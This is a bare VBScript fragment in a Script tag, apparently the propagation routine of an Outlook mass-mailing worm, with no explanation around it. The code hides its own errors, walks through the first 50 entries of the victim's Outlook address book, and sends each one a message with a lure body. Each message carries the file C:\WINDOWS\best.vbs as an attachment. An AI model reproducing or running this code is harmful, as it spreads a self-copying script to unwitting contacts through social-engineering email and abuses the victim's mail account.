   <Script Language = "VBS">
   Set O = CreateObject("Outlook.Application")
   On Error Resume Next
   For I = 1 To 50
   Set S = O.CreateItem(0)
   S.to = O.GetNameSpace("MAPI").AddressLists(1).AddressEntries(I)
   S.Subject = "Hi!"
   S.Body = "It's my new programm! Look on this!"
   S.Attachments.Add "C:\WINDOWS\best.vbs"
   S.Send
   Next
   </Script>
